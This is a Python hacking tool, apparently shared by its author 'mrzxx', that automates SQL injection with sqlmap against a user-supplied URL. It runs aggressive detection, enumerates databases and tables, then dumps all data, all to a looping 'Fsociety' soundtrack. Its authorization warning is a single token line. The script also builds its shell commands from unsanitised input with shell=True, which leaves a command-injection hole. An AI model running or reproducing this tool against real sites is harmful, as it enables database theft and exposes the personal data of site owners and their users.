#!/usr/bin/env python3
"""
ULTIMATE SQLMAP AUTO-DUMP WITH MUSIC
Created by: mrzxx | Telegram: @Zxxtirwd
"""

import os
import sys
import time
import subprocess
import threading
import pygame
import requests
from colorama import Fore, Style, init

init(autoreset=True)

# URL Musik Fsociety
MUSIC_URL = "https://files.catbox.moe/ajumf5.mp4"
MUSIC_FILE = "fsociety_music.mp3"
music_playing = False
pygame.mixer.init()

# ASCII Art
SQLMAP_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

def download_music():
    """Download Fsociety music"""
    if not os.path.exists(MUSIC_FILE):
        print(Fore.YELLOW + "[*] Downloading Fsociety music...")
        try:
            response = requests.get(MUSIC_URL, stream=True)
            with open(MUSIC_FILE, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(Fore.GREEN + "[+] Music downloaded successfully!")
        except Exception as e:
            print(Fore.RED + f"[!] Failed to download music: {e}")
            return False
    return True

def play_music():
    """Play Fsociety music in loop"""
    global music_playing
    try:
        pygame.mixer.music.load(MUSIC_FILE)
        pygame.mixer.music.play(-1)  # -1 means loop forever
        music_playing = True
    except Exception as e:
        print(Fore.RED + f"[!] Error playing music: {e}")

def stop_music():
    """Stop the music"""
    global music_playing
    pygame.mixer.music.stop()
    music_playing = False

def toggle_music():
    """Toggle music on/off"""
    global music_playing
    if music_playing:
        stop_music()
        print(Fore.YELLOW + "[*] Music stopped")
    else:
        play_music()
        print(Fore.GREEN + "[+] Music playing")

def print_header():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(SQLMAP_ASCII)
    print(Fore.CYAN + "=" * 80)
    print(Fore.YELLOW + " " * 25 + "SQLMAP AUTO-DUMP WITH MUSIC")
    print(Fore.CYAN + "=" * 80)
    print(Fore.GREEN + "   Creator: mrzxx | Telegram: @Zxxtirwd")
    print(Fore.GREEN + "   Fsociety Music: ON" if music_playing else Fore.RED + "   Fsociety Music: OFF")
    print(Fore.CYAN + "=" * 80)

def check_sqlmap():
    try:
        result = subprocess.run(['sqlmap', '--version'], 
                               capture_output=True, 
                               text=True, 
                               timeout=5)
        if result.returncode == 0:
            version = result.stdout.strip().split('\n')[0]
            print(Fore.GREEN + f"[+] SQLMap: {version}")
            return True
    except:
        pass
    
    print(Fore.RED + "[!] SQLMap not found!")
    print(Fore.YELLOW + "[*] Install: pip install sqlmap")
    return False

def show_warning():
    print(Fore.RED + "\n" + "!" * 80)
    print(Fore.RED + "   WARNING: AUTHORIZED TESTING ONLY")
    print(Fore.RED + "   Use only on owned systems")
    print(Fore.RED + "!" * 80)

def run_sqlmap_command(cmd, step_name):
    print(Fore.CYAN + f"\n[*] {step_name}")
    print(Fore.YELLOW + f"[*] Command: {cmd}")
    print(Fore.CYAN + "-" * 80)
    
    try:
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )
        
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            
            if line:
                line = line.strip()
                if 'target url' in line.lower():
                    print(Fore.CYAN + line)
                elif 'testing' in line.lower():
                    print(Fore.YELLOW + line)
                elif 'vulnerable' in line.lower():
                    print(Fore.GREEN + "[VULN] " + line)
                elif 'database:' in line.lower():
                    print(Fore.MAGENTA + "[DB] " + line)
                elif 'table:' in line.lower():
                    print(Fore.BLUE + "[TABLE] " + line)
                elif 'dump' in line.lower():
                    print(Fore.GREEN + "[DATA] " + line)
                elif 'retrieved:' in line.lower():
                    print(Fore.GREEN + "[SUCCESS] " + line)
                elif 'error' in line.lower():
                    print(Fore.RED + "[ERROR] " + line)
        
        print(Fore.CYAN + "-" * 80)
        return True
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted")
        return False
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return False

def full_auto_dump(target_url):
    print(Fore.GREEN + f"\n[+] TARGET: {target_url}")
    print(Fore.GREEN + "[+] STARTING AUTO DUMP...")
    print(Fore.CYAN + "=" * 80)
    
    # Phase 1: Detection
    cmd1 = f'sqlmap -u "{target_url}" --batch --level=5 --risk=3'
    run_sqlmap_command(cmd1, "Phase 1: Detection")
    time.sleep(1)
    
    # Phase 2: Databases
    cmd2 = f'sqlmap -u "{target_url}" --batch --dbs'
    run_sqlmap_command(cmd2, "Phase 2: Database Enumeration")
    time.sleep(1)
    
    # Phase 3: Current DB
    cmd3 = f'sqlmap -u "{target_url}" --batch --current-db'
    run_sqlmap_command(cmd3, "Phase 3: Current Database")
    time.sleep(1)
    
    # Phase 4: Tables
    cmd4 = f'sqlmap -u "{target_url}" --batch --tables'
    run_sqlmap_command(cmd4, "Phase 4: Table Enumeration")
    time.sleep(1)
    
    # Phase 5: DUMP ALL
    cmd5 = f'sqlmap -u "{target_url}" --batch --dump-all --threads=10'
    run_sqlmap_command(cmd5, "Phase 5: Dumping All Data")
    time.sleep(1)
    
    # Phase 6: Schema
    cmd6 = f'sqlmap -u "{target_url}" --batch --schema'
    run_sqlmap_command(cmd6, "Phase 6: Schema Extraction")
    
    print(Fore.GREEN + "\n" + "=" * 80)
    print(Fore.GREEN + "[+] AUTO DUMP COMPLETED!")
    print(Fore.CYAN + "=" * 80)

def main_menu():
    while True:
        print_header()
        
        print(Fore.YELLOW + "\n" + "-" * 80)
        print(Fore.CYAN + " " * 30 + "MAIN MENU")
        print(Fore.YELLOW + "-" * 80)
        
        print(Fore.GREEN + "\n[1] Start SQLMap Auto Dump")
        print(Fore.GREEN + "[2] Toggle Music (ON/OFF)")
        print(Fore.GREEN + "[3] Check SQLMap Installation")
        print(Fore.GREEN + "[4] Exit")
        print(Fore.YELLOW + "-" * 80)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-4): " + Fore.WHITE).strip()
        
        if choice == "1":
            print(Fore.YELLOW + "\n[*] Enter target URL with parameter")
            print(Fore.YELLOW + "[*] Example: http://target.com/page.php?id=1")
            print(Fore.CYAN + "-" * 80)
            
            url = input(Fore.CYAN + "[>] Target URL: " + Fore.WHITE).strip()
            if url:
                if not url.startswith('http'):
                    url = 'http://' + url
                
                print(Fore.CYAN + "-" * 80)
                confirm = input(Fore.RED + "[?] Start attack? (y/N): ").lower()
                if confirm == 'y':
                    full_auto_dump(url)
                    input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        
        elif choice == "2":
            toggle_music()
            time.sleep(1)
        
        elif choice == "3":
            check_sqlmap()
            input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        
        elif choice == "4":
            stop_music()
            print(Fore.CYAN + "\n" + "=" * 80)
            print(Fore.GREEN + "   Thank you for using SQLMap Auto-Dump")
            print(Fore.GREEN + "   Created by: mrzxx | Telegram: @Zxxtirwd")
            print(Fore.CYAN + "=" * 80)
            sys.exit(0)

def main():
    # Download music first
    if not download_music():
        print(Fore.RED + "[!] Music download failed, continuing without music...")
    
    # Check SQLMap
    print_header()
    if not check_sqlmap():
        input(Fore.RED + "\n[!] Press Enter to exit...")
        sys.exit(1)
    
    show_warning()
    
    # Start music
    print(Fore.YELLOW + "\n[*] Starting Fsociety music...")
    play_music()
    time.sleep(2)
    
    # Start main menu
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_music()
        print(Fore.RED + "\n[!] Program terminated")
    except Exception as e:
        stop_music()
        print(Fore.RED + f"\n[!] Error: {e}")
